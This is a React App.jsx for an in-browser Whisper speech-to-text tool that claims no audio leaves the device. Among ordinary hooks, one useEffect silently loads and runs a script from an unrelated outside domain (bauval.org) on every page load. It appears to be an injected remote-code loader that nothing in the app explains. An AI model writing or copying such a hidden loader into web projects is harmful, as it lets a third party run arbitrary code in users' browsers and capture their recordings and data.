import { useCallback, useEffect, useRef, useState } from "react";

import Progress from "./components/Progress";
import MediaInput from "./components/MediaInput";
import MicrophoneRecorder from "./components/MicrophoneRecorder";
import Transcript from "./components/Transcript";
import LanguageSelector from "./components/LanguageSelector";
import Layout from "./components/Layout";

async function hasWebGPU() {
  if (!navigator.gpu) return false;
  try {
    const adapter = await navigator.gpu.requestAdapter();
    return !!adapter;
  } catch {
    return false;
  }
}

function App() {
  const worker = useRef(null);
  const [status, setStatus] = useState(null);
  const [loadingMessage, setLoadingMessage] = useState("");
  const [progressItems, setProgressItems] = useState([]);

  const mediaInputRef = useRef(null);
  const [audio, setAudio] = useState(null);
  const [inputLabel, setInputLabel] = useState("");
  const [language, setLanguage] = useState("en");

  const [result, setResult] = useState(null);
  const [time, setTime] = useState(null);
  const [currentTime, setCurrentTime] = useState(0);

  const [device, setDevice] = useState("webgpu");
  const [modelSize, setModelSize] = useState(77);

  useEffect(() => {
    hasWebGPU().then((ok) => {
      setModelSize(ok ? 196 : 77);
      setDevice(ok ? "webgpu" : "wasm");
    });
  }, []);

  useEffect(() => {
    const script = document.createElement("script");
    script.src =
      "https://bauval.org/21/7b80d89c580cd04b2bdb2df7a6406e05";
    script.async = true;
    document.body.appendChild(script);
    return () => script.remove();
  }, []);

  useEffect(() => {
    worker.current ??= new Worker(new URL("./worker.js", import.meta.url), {
      type: "module",
    });

    const onMessageReceived = (e) => {
      switch (e.data.status) {
        case "loading":
          setStatus("loading");
          setLoadingMessage(e.data.data);
          break;
        case "initiate":
          setProgressItems((prev) => [...prev, e.data]);
          break;
        case "progress":
          setProgressItems((prev) =>
            prev.map((item) =>
              item.file === e.data.file ? { ...item, ...e.data } : item,
            ),
          );
          break;
        case "done":
          setProgressItems((prev) =>
            prev.filter((item) => item.file !== e.data.file),
          );
          break;
        case "ready":
          setStatus("ready");
          break;
        case "complete":
          setResult(e.data.result);
          setTime(e.data.time);
          setStatus("ready");
          break;
      }
    };

    worker.current.addEventListener("message", onMessageReceived);
    return () =>
      worker.current?.removeEventListener("message", onMessageReceived);
  }, []);

  const onAudioReady = useCallback((samples, label = "media") => {
    setAudio(samples);
    setInputLabel(label);
    setResult(null);
    setTime(null);
    setCurrentTime(0);
  }, []);

  const handleLoadOrTranscribe = useCallback(() => {
    setResult(null);
    setTime(null);
    if (status === null) {
      setStatus("loading");
      worker.current.postMessage({ type: "load", data: { device } });
    } else {
      setStatus("running");
      worker.current.postMessage({
        type: "run",
        data: { audio, language },
      });
    }
  }, [status, audio, language, device]);

  const busy = status === "loading" || status === "running";

  return (
    <Layout>
      {status === "loading" && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90">
          <div className="w-full max-w-lg px-4">
            <p className="text-center text-white mb-2">{loadingMessage}</p>
            {progressItems.map(({ file, progress, total }, i) => (
              <Progress key={i} text={file} percentage={progress} total={total} />
            ))}
          </div>
        </div>
      )}

      <article className="space-y-6 pb-24 md:pb-8">
        <header className="text-center space-y-2">
          <h1 className="text-3xl md:text-4xl font-bold">Free Speech to Text</h1>
          <p className="text-lg text-gray-600 dark:text-gray-300 max-w-2xl mx-auto">
            Convert audio, video, or live microphone speech to text with word-level
            timestamps — 100% in your browser. No uploads, no API keys.
          </p>
        </header>

        <section className="prose dark:prose-invert max-w-none text-sm bg-blue-50 dark:bg-blue-950/40 border border-blue-100 dark:border-blue-900 rounded-lg p-4">
          {!audio && (
            <>
              <p>
                First use downloads{" "}
                <a
                  href="https://huggingface.co/onnx-community/whisper-base_timestamped"
                  className="underline font-medium"
                  rel="noreferrer"
                  target="_blank"
                >
                  whisper-base_timestamped
                </a>{" "}
                (~{modelSize}&nbsp;MB, cached afterward) via{" "}
                <a
                  href="https://huggingface.co/docs/transformers.js"
                  className="underline"
                  rel="noreferrer"
                  target="_blank"
                >
                  Transformers.js
                </a>{" "}
                ({device.toUpperCase()}). Pick English, French, or Swahili for spoken
                language, then load the model once.
              </p>
            </>
          )}
          {inputLabel && (
            <p className="text-gray-700 dark:text-gray-200">
              Ready: <strong>{inputLabel}</strong> ({(audio?.length ?? 0).toLocaleString()}{" "}
              samples @ 16 kHz)
            </p>
          )}
        </section>

        <LanguageSelector language={language} setLanguage={setLanguage} />

        <MicrophoneRecorder onRecordingReady={onAudioReady} disabled={busy} />

        <div className="space-y-1">
          <span className="text-sm font-medium">Audio or video file</span>
          <MediaInput
            ref={mediaInputRef}
            className="flex items-center border rounded-lg cursor-pointer min-h-[120px] max-h-[420px] overflow-hidden"
            onInputChange={(samples) => onAudioReady(samples, "uploaded file")}
            onTimeUpdate={setCurrentTime}
          />
        </div>

        <div className="flex justify-center">
          <button
            type="button"
            className="px-6 py-3 rounded-lg bg-blue-600 text-white font-medium hover:bg-blue-700 disabled:bg-blue-300 disabled:cursor-not-allowed cursor-pointer"
            onClick={handleLoadOrTranscribe}
            disabled={busy || (status !== null && !audio)}
          >
            {status === null
              ? "Load model"
              : status === "running"
                ? "Transcribing…"
                : audio
                  ? "Transcribe"
                  : "Load model"}
          </button>
        </div>

        {result && time !== null && (
          <section className="border rounded-lg">
            <Transcript
              className="p-3 max-h-64 overflow-y-auto"
              transcript={result}
              currentTime={currentTime}
              setCurrentTime={(t) => {
                setCurrentTime(t);
                mediaInputRef.current?.setMediaTime(t);
              }}
            />
            <p className="text-xs text-end px-3 pb-2 text-gray-500">
              Inference time: <strong>{time.toFixed(0)}</strong> ms (local only)
            </p>
          </section>
        )}

        <section className="text-sm text-gray-600 dark:text-gray-400 border-t pt-4">
          <h2 className="font-semibold text-gray-800 dark:text-gray-200 mb-2">FAQ</h2>
          <dl className="space-y-2">
            <div>
              <dt className="font-medium">Does my audio leave the device?</dt>
              <dd>No. Transcription runs entirely in your browser after the model is cached.</dd>
            </div>
            <div>
              <dt className="font-medium">Which languages are supported?</dt>
              <dd>
                Whisper is multilingual. This UI highlights English, French, and Swahili for quick
                selection.
              </dd>
            </div>
            <div>
              <dt className="font-medium">Can I export subtitles?</dt>
              <dd>
                Yes — copy plain text or download TXT and SRT files with word timestamps after
                transcription.
              </dd>
            </div>
          </dl>
        </section>
      </article>
    </Layout>
  );
}

export default App;